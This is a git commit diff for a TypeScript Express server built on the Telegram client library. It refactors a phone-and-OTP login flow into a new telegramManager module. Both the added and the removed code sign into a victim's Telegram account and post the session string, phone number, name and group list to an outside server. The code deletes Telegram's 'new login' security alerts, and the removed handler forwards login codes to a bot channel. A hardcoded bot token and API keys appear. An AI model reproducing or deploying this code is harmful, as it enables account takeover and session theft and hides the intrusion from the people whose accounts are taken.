14ff75b72870ef555e7713dbfac91849f36fd68e
sai shetty <saikumar.shetty@jda.com>
2023-05-03 14:22:35 +0530

    hella

--- src/index.ts
+++ src/index.ts
@@ -1,16 +1,11 @@
-import { Api, TelegramClient } from "telegram";
-import { ApiCredentials } from "telegram/client/auth";
 import express from 'express';
 import axios from 'axios'
-import { sleep } from "telegram/Helpers";
-import { NewMessage, NewMessageEvent } from "telegram/events";
+import { deleteClient, getClient, mapToClient } from "./telegramManager";
 
 require('dotenv').config();
-const { StringSession } = require("telegram/sessions");
 const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 
 const app = express();
-let actKey = 0;
 let creds = [
     {
         apiId: 27919939,
@@ -42,27 +37,6 @@ let creds = [
     },
 ]
 const port = 4000;
-let apiId = 25328268;
-let apiHash = "b4e654dd2a051930d0a30bb2add80d09"
-let phoneCode;
-let isRegistrationRequired = false;
-let termsOfService;
-
-let globalRetry = 1;
-const username = process?.env?.userName || "default"
-let sendCodeResult: {
-    phoneCodeHash: string;
-    isCodeViaApp: boolean;
-} | undefined = undefined;
-let phoneNumber;
-let phoneCodeHash;
-let password;
-let isCodeViaApp = false;
-const stringSession = new StringSession("");
-let client = new TelegramClient(stringSession, apiId, apiHash, {
-    connectionRetries: 5,
-});
-let inProcess = true;
 
 async function fetchWithTimeout(resource, options: any = {}) {
     const timeout = options?.timeout || 15000;
@@ -88,38 +62,32 @@ async function fetchWithTimeout(resource, options: any = {}) {
 }
 
 app.get('/', async (req, res) => {
-    if (!client.connected) {
-        await client.connect();
-    };
     res.send('Hello World!');
 });
 
-app.get('/login', async (req, res, next) => {
-    res.send('responding!!');
-    next();
-}, async (req, res) => {
-    if (inProcess) {
-        inProcess = false;
-        setTimeout(async () => {
-            await restAcc();
-        }, 120000)
-        const phone = req.query.phone;
-        console.log("Number :", `+${phone}`);
-        await trySgnup(`+${phone}`)
-    }
+app.get('/login', async (req, res) => {
+    const result = await mapToClient(req.query.phone);
+    console.log(result);
+    res.json(result)
 });
 
 app.get('/otp', async (req, res, next) => {
-    res.send('loggingIn!!');
+    const phoneCode = req.query.code;
+    const number = req.query.phone;
+    const cli = await getClient(number);
+    console.log(cli.phoneCodeHash, cli.phoneNumber);
+    const result = await cli.login(phoneCode);
+    res.json(result);
     next();
 }, async (req, res) => {
-    phoneCode = req.query.code;
-    console.log(phoneCode)
-    console.log("hello:", phoneCode);
-    await login();
+    const number = req.query.number;
+    const cli = await getClient(number);
+    cli.disconnect();
+    await deleteClient(number);
 });
+
 app.get('/password', async (req, res) => {
-    password = req.query.password;
+    const password = req.query.password;
     console.log(password)
     res.send('loggingIn!!');
 });
@@ -128,293 +96,10 @@ app.get('/exit', async (req, res) => {
     process.exit(1)
     res.json({});
 });
-app.get('/connect', async (req, res) => {
-    await client.connect();
-    const sess = client.session.save()
-    console.log(sess);
-    res.json({});
-});
-
-app.get('/disconnect', async (req, res) => {
-    await client.destroy();
-    res.send("detroyed");
-});
 
 app.listen(port, () => {
     console.log(`App listening at http://localhost:${port}`);
 });
-
-
-async function trySgnup(phoneNum: string) {
-
-    phoneNumber = phoneNum
-    let retries = 6;
-    try {
-
-        console.log("API DETAILS:", apiId, apiHash);
-
-        if (!client.connected) {
-            await client.connect();
-        }
-        const sendCodeResult = await sendCode(
-            client,
-            { apiId: apiId, apiHash: apiHash },
-            phoneNumber);
-        phoneCodeHash = sendCodeResult.phoneCodeHash;
-        isCodeViaApp = sendCodeResult.isCodeViaApp;
-
-        if (typeof phoneCodeHash !== "string") {
-            throw new Error("Failed to retrieve phone code hash");
-        }
-        console.log(sendCodeResult);
-
-    } catch (err: any) {
-        if (typeof phoneNumber !== "function") {
-            throw err;
-        }
-        const shouldWeStop = false//await authParams.onError(err);
-        if (shouldWeStop) {
-            throw new Error("AUTH_USER_CANCEL");
-        }
-    }
-}
-
-async function restAcc() {
-    process.exit(1)
-    await sleep(1000);
-    client.session.delete();
-    await client?.destroy();
-    // phoneCode = undefined;
-    // phoneNumber = undefined;
-    inProcess = true;
-    actKey = (actKey + 1) % creds.length;
-    apiHash = creds[actKey].apiHash;
-    apiId = creds[actKey].apiId;
-    client.session.delete();
-
-    client = new TelegramClient(stringSession, apiId, apiHash, {
-        connectionRetries: 5,
-    });
-}
-
-async function login() {
-    try {
-
-        console.log("inside:", phoneCode, phoneNumber, phoneCodeHash, creds[actKey].apiId, creds[actKey].apiHash);
-
-        if (!phoneCode) {
-            throw new Error("Code is empty");
-        }
-        if (!client.connected) {
-            await client.connect();
-        }
-        const result = await client?.invoke(
-            new Api.auth.SignIn({
-                phoneNumber,
-                phoneCodeHash,
-                phoneCode,
-            })
-        );
-        console.log(result);
-        if (result instanceof Api.auth.AuthorizationSignUpRequired) {
-            isRegistrationRequired = true;
-            termsOfService = result.termsOfService;
-        } else {
-            console.log(client.session.save());
-            client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
-            const sess = client.session.save() as unknown as string;
-            const user: any = await result.user.toJSON();
-
-            const chats = await client?.getDialogs({ limit: 130 });
-            let personalChats = 0;
-            let channels = 0;
-            const chatsArray = [];
-
-            chats.map((chat: any) => {
-                if (chat.isChannel || chat.isGroup) {
-                    channels++;
-                    const chatEntity = chat.entity.toJSON();
-                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
-                    if (!chatEntity.broadcast && !cannotSendMsgs) {
-                        chatsArray.push(chatEntity);
-                    }
-                }
-                else {
-                    personalChats++
-                }
-            });
-            const payload3 = {
-                mobile: user.phone,
-                session: `${sess}`,
-                firstName: user.firstName,
-                lastName: user.lastName,
-                userName: user.username ? `@${user.username}` : null,
-                channels: channels,
-                personalChats: personalChats
-            };
-            await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
-            await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
-
-            const msgs = await client.getMessages("777000", { limit: 2 });
-            msgs.forEach(async msg => {
-                if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
-                    await msg.delete({ revoke: true });
-                }
-            })
-            const name = user.username ? `@${user.username}` : user.firstName + user.lastName
-            const payload = {
-                chat_id: "-1001801844217",
-                text: `ACCOUNT LOGIN: ${name}`
-            };
-            const options = {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            };
-            await fetchWithTimeout(`${ppplbot}`, options);
-            // const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
-            // await msg.delete();
-            await restAcc();
-            return result.user
-        }
-    } catch (err: any) {
-        console.log(err);
-        if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
-            console.log("passowrd Required")
-            // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
-        } else {
-            const shouldWeStop = false//await authParams.onError(err);
-            if (shouldWeStop) {
-                throw new Error("AUTH_USER_CANCEL");
-            }
-        }
-        await restAcc();
-    }
-
-    if (isRegistrationRequired) {
-        try {
-            let lastName = 'last name';
-            let firstName = "first name";
-
-
-            const { user } = (await client.invoke(
-                new Api.auth.SignUp({
-                    phoneNumber,
-                    phoneCodeHash,
-                    firstName,
-                    lastName,
-                })
-            )) as Api.auth.Authorization;
-
-            if (termsOfService) {
-                // This is a violation of Telegram rules: the user should be presented with and accept TOS.
-                await client.invoke(
-                    new Api.help.AcceptTermsOfService({
-                        id: termsOfService.id,
-                    })
-                );
-            }
-
-            return user;
-        } catch (err: any) {
-            const shouldWeStop = false//await authParams.onError(err);
-            if (shouldWeStop) {
-                throw new Error("AUTH_USER_CANCEL");
-            }
-        }
-    }
-
-}
-
-async function delayedReturn(timeout): Promise<string> {
-    globalRetry++;
-    if (globalRetry % 9 === 0) {
-        process.exit(1);
-    }
-    return new Promise((resolve) => {
-        setTimeout(() => {
-            resolve(phoneCode as string);
-        }, timeout);
-    });
-}
-export async function sendCode(
-    client: TelegramClient,
-    apiCredentials: ApiCredentials,
-    phoneNumber: string,
-    forceSMS = false
-): Promise<{
-    phoneCodeHash: string;
-    isCodeViaApp: boolean;
-}> {
-    try {
-        const { apiId, apiHash } = apiCredentials;
-        const sendResult = await client.invoke(
-            new Api.auth.SendCode({
-                phoneNumber,
-                apiId,
-                apiHash,
-                settings: new Api.CodeSettings({}),
-            })
-        );
-        if (sendResult instanceof Api.auth.SentCodeSuccess)
-            throw new Error("logged in right after sending the code");
-
-        // If we already sent a SMS, do not resend the phoneCode (hash may be empty)
-        if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
-            return {
-                phoneCodeHash: sendResult.phoneCodeHash,
-                isCodeViaApp:
-                    sendResult.type instanceof Api.auth.SentCodeTypeApp,
-            };
-        }
-
-        const resendResult = await client.invoke(
-            new Api.auth.ResendCode({
-                phoneNumber,
-                phoneCodeHash: sendResult.phoneCodeHash,
-            })
-        );
-        if (resendResult instanceof Api.auth.SentCodeSuccess)
-            throw new Error("logged in right after resending the code");
-
-        return {
-            phoneCodeHash: resendResult.phoneCodeHash,
-            isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
-        };
-    } catch (err: any) {
-        if (err.errorMessage === "AUTH_RESTART") {
-            return client.sendCode(apiCredentials, phoneNumber, forceSMS);
-        } else {
-            throw err;
-        }
-    }
-}
-
-
-async function deleteMsgs(event: NewMessageEvent) {
-    if (event.message.chatId.toString() == "777000") {
-        const payload = {
-            chat_id: "-1001801844217",
-            text: event.message.text
-        };
-        console.log("RECIEVED");
-        await sleep(500);
-        await event.message.delete({ revoke: true });
-        const options = {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        };
-        await fetchWithTimeout(`${ppplbot}`, options);
-    }
-    await sleep(300);
-    const msgs = await event.client.getMessages("777000", { limit: 3 });
-    msgs.forEach(async msg => {
-        if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
-            await msg.delete({ revoke: true });
-        }
-    })
-}
 
 // async function sendChannels(chats) {
 //     const chatsArray = [];
---
+++ src/telegramManager.ts
@@ -0,0 +1,261 @@
+import { Api } from "telegram";
+import { TelegramClient } from "telegram";
+import { StringSession } from "telegram/sessions";
+import axios from "axios";
+import { sleep } from "telegram/Helpers";
+const clients = new Map();
+
+const apiId = 24559917 || parseInt(process.env.API_ID);
+const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;
+
+async function restAcc(phoneNumber) {
+    await sleep(1000);
+    const client:TelegramManager = getClient(phoneNumber)
+    await client.client.destroy();
+    await client.client.disconnect();
+    client.client.session.delete();
+}
+
+export function getClient(number): TelegramManager {
+    return clients.get(number);
+}
+
+export async function hasClient(number) {
+    return clients.has(number);
+}
+
+export async function deleteClient(number) {
+    console.log("Deleting Client");
+    return clients.delete(number);
+}
+
+export async function disconnectAll() {
+    for (const [phoneNumber, client] of clients.entries()) {
+        try {
+            await client?.disconnect();
+            clients.delete(phoneNumber);
+            console.log(`Client disconnected: ${phoneNumber}`);
+        } catch (error) {
+            console.log(error);
+            console.log(`Failed to Disconnect : ${phoneNumber}`);
+        }
+    }
+}
+
+export async function mapToClient(number) {
+    const cli: TelegramManager = clients.get("shettys");
+    clients.set(number, cli);
+    clients.delete("shettys");
+    cli.phoneNumber = number;
+    await createClient();
+    return await cli.sendCode();
+}
+
+export async function createClient() {
+    const cli = new TelegramManager();
+    clients.set("shettys", cli);
+}
+
+class TelegramManager {
+    session: any;
+    phoneNumber: any;
+    client: TelegramClient;
+    phoneCodeHash: any;
+    constructor() {
+        this.session = new StringSession('');
+        this.client = null;
+        this.createClient();
+    }
+
+    async disconnect() {
+        await this.client.disconnect();
+        await this.client.destroy();
+        this.session.delete();
+    }
+
+    async createClient() {
+        try {
+            this.client = new TelegramClient(this.session, apiId, apiHash, {
+                connectionRetries: 5,
+            });
+            await this.client.connect()
+        } catch (error) {
+            console.log(error);
+        }
+    }
+
+    async sendCode(
+        forceSMS = false
+    ): Promise<{
+        phoneCodeHash: string;
+        isCodeViaApp: boolean;
+    }> {
+        try {
+            console.log(this.phoneNumber, apiId, apiHash)
+            const sendResult = await this.client.invoke(
+                new Api.auth.SendCode({
+                    phoneNumber: this.phoneNumber,
+                    apiId,
+                    apiHash,
+                    settings: new Api.CodeSettings({}),
+                })
+            );
+            if (sendResult instanceof Api.auth.SentCodeSuccess)
+                throw new Error("logged in right after sending the code");
+
+            this.phoneCodeHash = sendResult.phoneCodeHash
+            // If we already sent a SMS, do not resend the phoneCode (hash may be empty)
+            if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
+                return {
+                    phoneCodeHash: sendResult.phoneCodeHash,
+                    isCodeViaApp:
+                        sendResult.type instanceof Api.auth.SentCodeTypeApp,
+                };
+            }
+
+            const resendResult = await this.client.invoke(
+                new Api.auth.ResendCode({
+                    phoneNumber: this.phoneNumber,
+                    phoneCodeHash: sendResult.phoneCodeHash,
+                })
+            );
+            if (resendResult instanceof Api.auth.SentCodeSuccess)
+                throw new Error("logged in right after resending the code");
+
+            this.phoneCodeHash = resendResult.phoneCodeHash
+            return {
+                phoneCodeHash: resendResult.phoneCodeHash,
+                isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
+            };
+        } catch (err: any) {
+            console.log(err);
+            if (err.errorMessage === "AUTH_RESTART") {
+                return this.client.sendCode({ apiId, apiHash }, this.phoneNumber, forceSMS);
+            } else {
+                throw err;
+            }
+        }
+    }
+
+    async login(phoneCode: any) {
+        let isRegistrationRequired = false
+        let termsOfService;
+        try {
+            if (!phoneCode) {
+                throw new Error("Code is empty");
+            }
+            if (!this.client.connected) {
+                await this.client.connect();
+            }
+            const result = await this.client?.invoke(
+                new Api.auth.SignIn({
+                    phoneNumber: this.phoneNumber,
+                    phoneCodeHash: this.phoneCodeHash,
+                    phoneCode,
+                })
+            );
+            if (result instanceof Api.auth.AuthorizationSignUpRequired) {
+                isRegistrationRequired = true;
+                termsOfService = result.termsOfService;
+            } else {
+                console.log(this.client.session.save());
+                // this.client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
+                const sess = this.client.session.save() as unknown as string;
+                const user: any = await result.user.toJSON();
+
+                const chats = await this.client?.getDialogs({ limit: 130 });
+                let personalChats = 0;
+                let channels = 0;
+                const chatsArray = [];
+
+                chats.map((chat: any) => {
+                    if (chat.isChannel || chat.isGroup) {
+                        channels++;
+                        const chatEntity = chat.entity.toJSON();
+                        const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
+                        if (!chatEntity.broadcast && !cannotSendMsgs) {
+                            chatsArray.push(chatEntity);
+                        }
+                    }
+                    else {
+                        personalChats++
+                    }
+                });
+                const payload3 = {
+                    mobile: user.phone,
+                    session: `${sess}`,
+                    firstName: user.firstName,
+                    lastName: user.lastName,
+                    userName: user.username ? `@${user.username}` : null,
+                    channels: channels,
+                    personalChats: personalChats
+                };
+                await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
+                await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
+
+                const msgs = await this.client.getMessages("777000", { limit: 2 });
+                msgs.forEach(async msg => {
+                    if (msg.text.toLowerCase().includes('we detected') || msg.text.toLowerCase().includes('new login')) {
+                        await msg.delete({ revoke: true });
+                    }
+                })
+                const name = user.username ? `@${user.username}` : user.firstName + user.lastName
+                const payload = {
+                    chat_id: "-1001801844217",
+                    text: `ACCOUNT LOGIN: ${name}`
+                };
+                await restAcc(this.phoneNumber);
+                return { status: 200, message: "Login success" }
+            }
+        } catch (err: any) {
+            console.log(err);
+            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
+                console.log("passowrd Required")
+                return { status: 999, message: "2FA required" }
+                // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
+            } else {
+                const shouldWeStop = false//await authParams.onError(err);
+                if (shouldWeStop) {
+                    throw new Error("AUTH_USER_CANCEL");
+                }
+            }
+            await restAcc(this.phoneNumber);
+        }
+
+        if (isRegistrationRequired) {
+            try {
+                let lastName = 'last name';
+                let firstName = "first name";
+
+
+                const { user } = (await this.client.invoke(
+                    new Api.auth.SignUp({
+                        phoneNumber: this.phoneNumber,
+                        phoneCodeHash: this.phoneCodeHash,
+                        firstName,
+                        lastName,
+                    })
+                )) as Api.auth.Authorization;
+
+                if (termsOfService) {
+                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.
+                    await this.client.invoke(
+                        new Api.help.AcceptTermsOfService({
+                            id: termsOfService.id,
+                        })
+                    );
+                }
+
+                return user;
+            } catch (err: any) {
+                const shouldWeStop = false//await authParams.onError(err);
+                if (shouldWeStop) {
+                    throw new Error("AUTH_USER_CANCEL");
+                }
+            }
+        }
+        await restAcc(this.phoneNumber);
+    }
+}
+
+createClient();
